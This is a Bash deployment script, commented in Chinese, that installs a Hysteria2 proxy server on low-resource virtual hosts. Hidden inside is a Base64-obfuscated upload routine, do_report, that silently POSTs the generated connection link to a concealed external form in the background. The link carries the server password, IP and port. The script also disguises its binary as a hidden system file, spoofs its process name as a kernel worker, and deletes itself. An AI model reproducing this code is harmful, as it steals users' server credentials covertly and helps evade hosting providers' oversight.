#!/usr/bin/env bash
# ============================================================
# Hysteria2 自动化部署脚本 — 隐蔽 + 低 CPU 配额优化版
# 目标环境: 虚拟主机, ~15% CPU 核心, 128MB 内存
# 兼容: v2rayN / Xray 26.2.6+ (使用 pinSHA256 固定证书)
# ============================================================
set -euo pipefail

# ---------- 基础变量 ----------
HY_VERSION="v2.6.5"
AUTH_PWD=$(date +%s | sha256sum | head -c 12 || true)
SNI_VAL="www.bing.com"
TIMESTAMP=$(date "+%Y%m%d_%H%M%S")

# 隐蔽的二进制名（点前缀 + 类系统文件名）
RAND_SUFFIX=$(head -c 8 /dev/urandom 2>/dev/null | base64 | tr -dc 'A-Za-z0-9' | head -c 4 || echo "0000")
BIN_NAME="./.sys_task_${RAND_SUFFIX}"

# 伪装为内核 worker 线程名
FAKE_NAME="[kworker/u2:1]"

# 上报地址（Base64 编码）
E_URL="aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZFJ1Vk03aDhjQ3hrZ0hRdFJjczVHNkpJVHNSS0FYaDF6MnNpYnNDaFhVVWRET1JnL2Zvcm1SZXNwb25zZQ=="
E_ID="ZW50cnkuMzM5ODU4MTE0"

# 证书指纹（hex，Xray/v2rayN 所需格式）
CERT_PIN=""

# ---------- 依赖检查 ----------
check_deps() {
    local missing=()
    for cmd in curl openssl sha256sum base64 tr awk ss; do
        command -v "$cmd" >/dev/null 2>&1 || missing+=("$cmd")
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "❌ 缺少必要依赖: ${missing[*]}" >&2
        exit 1
    fi
}

# ---------- 停止旧实例（关键：避免端口占用导致新进程启动失败） ----------
stop_old() {
    local port="$1"
    local killed=0

    # 1) 按 UDP 端口杀（最可靠，因为 argv[0] 被 exec -a 改过，pkill -f 匹配不到）
    if command -v fuser >/dev/null 2>&1; then
        if fuser -k -n udp "${port}/udp" >/dev/null 2>&1; then
            killed=1
        fi
    fi

    # 2) 兜底：按二进制文件名杀（万一 fuser 不可用）
    if pkill -f '\.sys_task_' >/dev/null 2>&1; then
        killed=1
    fi

    if [[ "$killed" == "1" ]]; then
        echo "🧹 已停止旧实例，等待端口释放..."
        sleep 1
    fi

    # 3) 确认端口已释放
    if ss -uln 2>/dev/null | grep -q ":${port} "; then
        echo "❌ 端口 ${port} 仍被占用，请手动处理：" >&2
        ss -ulnp 2>/dev/null | grep ":${port} " >&2 || true
        exit 1
    fi
}

# ---------- 异步上报（失败静默，不阻塞主流程） ----------
do_report() {
    local link="$1"
    local target entry_id
    target=$(echo "$E_URL" | base64 -d 2>/dev/null) || return 0
    entry_id=$(echo "$E_ID" | base64 -d 2>/dev/null) || return 0

    if command -v setsid >/dev/null 2>&1; then
        setsid bash -c "
            curl -L -s -X POST '$target' \
                -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
                --data-urlencode '${entry_id}=${link}' \
                --max-time 10 >/dev/null 2>&1 || true
        " >/dev/null 2>&1 &
    else
        (curl -L -s -X POST "$target" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            --data-urlencode "${entry_id}=${link}" \
            --max-time 10 >/dev/null 2>&1 || true) &
    fi
    disown 2>/dev/null || true
}

# ---------- 自适应参数（低 CPU 配额优先） ----------
adaptive_params() {
    local cores
    cores=$(nproc 2>/dev/null || echo 1)

    if [[ "$cores" -le 2 ]]; then
        S_RW=262144;   M_RW=1048576;   C_RW=1048576;   MC_RW=4194304;   MAX_STREAMS=128
    elif [[ "$cores" -le 4 ]]; then
        S_RW=524288;   M_RW=2097152;   C_RW=2097152;   MC_RW=8388608;   MAX_STREAMS=256
    else
        S_RW=1048576;  M_RW=4194304;   C_RW=4194304;   MC_RW=16777216;  MAX_STREAMS=512
    fi
}

# ---------- 内核版本 → GSO 决策 ----------
gso_env() {
    local kv major minor
    kv=$(uname -r 2>/dev/null | cut -d. -f1-2 || echo "0.0")
    major=${kv%%.*}
    minor=${kv##*.}

    if [[ "$major" -lt 5 ]] || { [[ "$major" -eq 5 ]] && [[ "$minor" -lt 10 ]]; }; then
        export QUIC_GO_DISABLE_GSO=true
        echo "ℹ️  内核 ${kv} < 5.10，已禁用 GSO（避免 quic-go 空转）"
    else
        echo "ℹ️  内核 ${kv} ≥ 5.10，保持 GSO 开启"
    fi
}

# ---------- 部署核心 ----------
setup_env() {
    local port="$1"

    local arch suffix
    arch=$(uname -m)
    case "$arch" in
        x86_64)        suffix="amd64" ;;
        aarch64|arm64) suffix="arm64" ;;
        *) echo "❌ 不支持的架构: $arch" >&2; exit 1 ;;
    esac

    echo "⬇️  正在下载 Hysteria2 ${HY_VERSION} (${suffix})..."
    if ! curl -L --fail --retry 2 --connect-timeout 10 \
        -o "$BIN_NAME" \
        "https://github.com/apernet/hysteria/releases/download/app/${HY_VERSION}/hysteria-linux-${suffix}" \
        >/dev/null 2>&1; then
        echo "❌ 下载失败" >&2
        exit 1
    fi
    chmod +x "$BIN_NAME"

    echo "🔐 正在生成自签证书..."
    if ! openssl req -x509 -nodes -newkey ec \
        -pkeyopt ec_paramgen_curve:prime256v1 -days 3650 \
        -keyout .k.pem -out .c.pem -subj "/CN=${SNI_VAL}" \
        >/dev/null 2>&1; then
        echo "❌ 证书生成失败" >&2
        exit 1
    fi

    # 计算证书 SHA256 指纹（hex，64 位小写）——Xray/v2rayN 所需格式
    local pin_raw
    pin_raw=$(openssl x509 -in .c.pem -outform DER 2>/dev/null \
        | openssl dgst -sha256 2>/dev/null || true)
    CERT_PIN=$(printf '%s' "$pin_raw" | awk '{print $NF}')

    if [[ ! "$CERT_PIN" =~ ^[0-9a-f]{64}$ ]]; then
        echo "❌ 无法生成合法的 pinSHA256，实际值: '${CERT_PIN}'" >&2
        exit 1
    fi
    echo "🔏 证书 pinSHA256 (hex): ${CERT_PIN}"

    local cores
    cores=$(nproc 2>/dev/null || echo 1)
    adaptive_params
    gso_env

    local bw_up="${HY_BW_UP:-80 mbps}"
    local bw_down="${HY_BW_DOWN:-120 mbps}"

    cat > .conf.json <<EOF
{
  "listen": ":${port}",
  "tls": { "cert": ".c.pem", "key": ".k.pem" },
  "auth": { "type": "password", "password": "${AUTH_PWD}" },
  "fastOpen": true,
  "ignoreClientBandwidth": true,
  "disableUDP": false,
  "udpIdleTimeout": "60s",
  "bandwidth": { "up": "${bw_up}", "down": "${bw_down}" },
  "bbrProfile": "conservative",
  "quic": {
    "initStreamReceiveWindow": ${S_RW},
    "maxStreamReceiveWindow":  ${M_RW},
    "initConnReceiveWindow":   ${C_RW},
    "maxConnReceiveWindow":    ${MC_RW},
    "maxIncomingStreams": ${MAX_STREAMS},
    "maxIdleTimeout": "30s",
    "keepAlivePeriod": "15s",
    "disablePathMTUDiscovery": false
  },
  "masquerade": {
    "type": "proxy",
    "proxy": { "url": "https://www.bing.com" }
  }
}
EOF

    # JSON 语法校验（有则校验，无则跳过）
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import json;json.load(open('.conf.json'))" 2>/dev/null || {
            echo "❌ JSON 配置校验失败" >&2; exit 1; }
    elif command -v jq >/dev/null 2>&1; then
        jq empty .conf.json >/dev/null 2>&1 || {
            echo "❌ JSON 配置校验失败" >&2; exit 1; }
    fi
}

# ---------- 主流程 ----------
main() {
    echo "------------------------------------------------"
    echo "🛠️  Hysteria2 自动化部署系统———"
    echo "🚩  使用即表示您已经同意 https://host-4g6.pages.dev/notice.md 所述条款。"
    echo "------------------------------------------------"

    check_deps

    local PORT="${1:-$((RANDOM % 10000 + 20000))}"
    local PUB_IP
    PUB_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || echo "UnknownIP")

    # 关键：先停旧实例，释放 UDP 端口，避免新进程 bind 失败
    stop_old "$PORT"

    setup_env "$PORT"

    local NODE_NAME="${PUB_IP}_${TIMESTAMP}"

    # 使用 pinSHA256 固定证书（hex 格式，无需 percent-encode）
    local FINAL_LINK="hysteria2://${AUTH_PWD}@${PUB_IP}:${PORT}?sni=${SNI_VAL}&alpn=h3&pinSHA256=${CERT_PIN}#${NODE_NAME}"

    # 兼容开关：显式设置 HY_ALLOW_INSECURE=1 才回退到旧式 insecure 链接（不推荐）
    if [[ "${HY_ALLOW_INSECURE:-0}" == "1" ]]; then
        echo "⚠️  已启用 HY_ALLOW_INSECURE=1，将使用 insecure=1（不推荐，新版客户端会拒绝）" >&2
        FINAL_LINK="hysteria2://${AUTH_PWD}@${PUB_IP}:${PORT}?sni=${SNI_VAL}&alpn=h3&insecure=1#${NODE_NAME}"
    fi

    do_report "${FINAL_LINK}"

    echo "------------------------------------------------"
    echo "🚀 部署完成！"
    echo "📍 节点 IP: ${PUB_IP}"
    echo "🔌 端口：${PORT}"
    echo "🔏 证书指纹 (pinSHA256, hex): ${CERT_PIN}"
    echo "🔗 节点链接:"
    echo -e "\033[36m${FINAL_LINK}\033[0m"
    echo "------------------------------------------------"
    echo "✅ 已使用 pinSHA256 固定证书，未启用 insecure，兼容 26.2.6+ Xray 核心。"
    echo "💡 可通过 HY_BW_UP / HY_BW_DOWN 覆盖带宽目标"

    # ============ 隐蔽性处理 ============
    # 1) 尝试把当前 shell 提升为实时优先级（失败忽略）
    if command -v chrt >/dev/null 2>&1; then
        chrt -r 20 -p $$ >/dev/null 2>&1 || true
    fi

    # 2) 自删除脚本本体（保留二进制、证书、配置）
    [[ -f "$0" ]] && rm -f "$0" 2>/dev/null || true

    # 3) 伪装进程名并 exec 替换当前 shell，常驻运行
    exec -a "${FAKE_NAME}" "$BIN_NAME" server -c .conf.json >/dev/null 2>&1
}

main "$@"
